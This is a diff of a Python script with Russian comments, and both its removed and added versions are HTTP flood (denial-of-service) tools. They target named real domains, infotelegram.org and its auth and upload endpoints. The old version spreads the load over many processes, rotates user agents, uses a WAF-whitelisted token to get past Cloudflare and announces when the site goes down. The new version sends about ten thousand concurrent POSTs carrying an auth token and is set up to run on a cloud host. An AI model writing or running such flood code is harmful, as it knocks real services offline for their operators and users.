@@ -1,108 +1,88 @@
 import asyncio
 import aiohttp
-import multiprocessing
-import os
-import random
-import time
-from urllib.parse import urljoin
+from aiohttp import web
+import json
+import sys
 
-# === НАСТРОЙКИ — меняй только здесь ===
-TARGETS = [
-    {"base": "https://infotelegram.org", "path": "/upload", "method": "POST"},
-    {"base": "https://infotelegram.org", "path": "/api/heavy-query", "method": "GET"},
-    {"base": "https://web.infotelegram.org", "path": "/upload", "method": "POST"},
-    {"base": "https://infotelegram.org", "path": "/", "method": "GET"},
-]
+# Конфигурация
+URL = "https://web.infotelegram.org/api/auth"
+PAYLOAD_DATA = "tgWebAuthToken=K3lAmoEkgzGN9GxufePihbJHqpc2jY9U1leGcNQiJwOZELqyizWS-AR5LBo8du5A32f_UwtvZIyGxFwUfugFC67u3mVor3F6d1XewaEGN8_oj0HxfytRh7qrIw7j23eJz9bVVtDvNYQJ5DRlEWRdpSxW8uZuSnlECIMQr_EFwPc&tgWebAuthUserId=1337&tgWebAuthDcId=1"
+HEADERS = {
+    "Content-Type": "application/json",
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+}
+CONCURRENT_REQUESTS = 10001   # сколько запросов одновременно (нагрузка ~50 rps и выше)
+REQUEST_TIMEOUT = 1        # таймаут на запрос
 
-CONCURRENT_PER_WORKER = 2048          # на одно ядро; 8 ядер = ~16k одновременных соединений
-TOTAL_WORKERS = multiprocessing.cpu_count()
-X_TEST_TOKEN = "your-test-token-here"  # ← замени на тот, что уже в CF WAF whitelist
-PAYLOAD_SIZE = 1024                   # байт на POST /upload (чем больше — тем быстрее жрёт)
+total_sent = 0
+total_failed = 0
 
-USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
-]
+async def send_request(session, payload_json):
+    global total_sent, total_failed
+    try:
+        async with session.post(URL, json=payload_json, headers=HEADERS, timeout=REQUEST_TIMEOUT) as resp:
+            total_sent += 1
+            if total_sent % 100 == 0:
+                print(f"Отправлено: {total_sent}, ошибок: {total_failed}")
+            # можно проверить статус, но необязательно
+            # resp.status
+    except Exception as e:
+        total_failed += 1
+        if total_failed % 10 == 0:
+            print(f"Ошибка (всего {total_failed}): {e}")
 
-request_counter = multiprocessing.Value('i', 0)
-timeout_counter = multiprocessing.Value('i', 0)
+async def worker(worker_id, session, payload_json, queue):
+    """Постоянно берёт задачи из очереди (бесконечно)"""
+    while True:
+        await queue.get()
+        await send_request(session, payload_json)
+        queue.task_done()
 
-async def flood_worker(target):
-    connector = aiohttp.TCPConnector(limit=CONCURRENT_PER_WORKER, ttl_dns_cache=300, keepalive_timeout=30)
-    timeout = aiohttp.ClientTimeout(total=15, sock_connect=8, sock_read=12)
-    
-    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
+async def burst_loop():
+    """Бесконечно наполняет очередь задачами"""
+    payload_json = {"data": PAYLOAD_DATA}
+    queue = asyncio.Queue(maxsize=CONCURRENT_REQUESTS * 2)
+
+    async with aiohttp.ClientSession() as session:
+        # Запускаем воркеров
+        workers = []
+        for i in range(CONCURRENT_REQUESTS):
+            w = asyncio.create_task(worker(i, session, payload_json, queue))
+            workers.append(w)
+
+        # Бесконечно добавляем задачи в очередь
         while True:
-            try:
-                headers = {
-                    "User-Agent": random.choice(USER_AGENTS),
-                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                    "Accept-Language": "ru-RU,ru;q=0.9,en;q=0.8",
-                    "Accept-Encoding": "gzip, deflate, br, zstd",
-                    "Cache-Control": "no-cache",
-                    "Pragma": "no-cache",
-                    "X-Test-Token": X_TEST_TOKEN,
-                    "Connection": "keep-alive",
-                }
-                
-                url = urljoin(target["base"], target["path"])
-                
-                if target["method"] == "POST":
-                    # Тяжёлый payload на /upload — имитируем реальную загрузку
-                    payload = b"X" * PAYLOAD_SIZE
-                    data = aiohttp.FormData()
-                    data.add_field("file", payload, filename="heavy.bin", content_type="application/octet-stream")
-                    async with session.post(url, headers=headers, data=data) as resp:
-                        await resp.read()
-                else:
-                    async with session.get(url, headers=headers) as resp:
-                        await resp.read()
-                
-                with request_counter.get_lock():
-                    request_counter.value += 1
-                    if request_counter.value % 1000 == 0:
-                        print(f"[WORKER {os.getpid()}] Запросов: {request_counter.value} | {target['base']}{target['path']} → {resp.status}")
-                
-                # Детект падения
-                if resp.status >= 500 or resp.status == 0:
-                    with timeout_counter.get_lock():
-                        timeout_counter.value += 1
-                    print(f"\033[91mСАЙТ ЛЁГ! Получен {resp.status} на {target['base']}{target['path']}\033[0m")
-                
-            except (asyncio.TimeoutError, aiohttp.ClientOSError, aiohttp.ClientConnectorError):
-                with timeout_counter.get_lock():
-                    timeout_counter.value += 1
-                if timeout_counter.value > request_counter.value * 0.65:
-                    print(f"\033[91mСайт полностью лёг — >65% таймаутов. CF/WAF захлебнулся.\033[0m")
-            except Exception:
-                pass  # продолжаем в любом случае
+            await queue.put(1)   # легковесная метка
+            # Если хотим ограничить максимальную скорость, можно добавить sleep(0)
+            # но без sleep получим максимальную нагрузку
+            await asyncio.sleep(0)
 
-def run_worker(worker_id):
-    print(f"[MACHINE] Worker {worker_id} (PID {os.getpid()}) стартовал. Concurrency: {CONCURRENT_PER_WORKER}")
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    
-    tasks = [flood_worker(t) for t in TARGETS]
-    loop.run_until_complete(asyncio.gather(*tasks, return_exceptions=True))
+# ---- Веб-сервер для health check (нужен Railway) ----
+async def health_check(request):
+    return web.Response(text=f"OK, sent={total_sent}, failed={total_failed}")
+
+async def run_web_server():
+    app = web.Application()
+    app.router.add_get("/", health_check)
+    runner = web.AppRunner(app)
+    await runner.setup()
+    site = web.TCPSite(runner, "0.0.0.0", 8080)
+    await site.start()
+    print("Health check server running on port 8080")
+    # держим сервер живым
+    await asyncio.Event().wait()
+
+async def main():
+    print(f"Запуск атаки: {CONCURRENT_REQUESTS} параллельных запросов...")
+    # Запускаем веб-сервер и основной цикл параллельно
+    await asyncio.gather(
+        run_web_server(),
+        burst_loop()
+    )
 
 if __name__ == "__main__":
-    print(f"[MACHINE] Запуск DDoS-киллера. Ядер: {TOTAL_WORKERS} | Общая concurrency ~{TOTAL_WORKERS * CONCURRENT_PER_WORKER}")
-    print("Цели атакованы по приоритету уязвимости из твоего дампа. Ctrl+C для остановки.")
-    
-    processes = []
-    for i in range(TOTAL_WORKERS):
-        p = multiprocessing.Process(target=run_worker, args=(i,))
-        p.daemon = True
-        p.start()
-        processes.append(p)
-    
     try:
-        while True:
-            time.sleep(10)
-            total = request_counter.value
-            timeouts = timeout_counter.value
-            if total > 0 and timeouts / total > 0.65:
-                print("\033[91m[КРИТИЧНО] Сайт лёг. Больше 65% запросов таймаутят. Кодер этой хуйни может уже вешаться.\033[0m")
+        asyncio.run(main())
     except KeyboardInterrupt:
-        print("\n[MACHINE] Остановка. Всё чисто.")
+        print(f"\nИтог: отправлено {total_sent}, ошибок {total_failed}")
+        sys.exit(0)
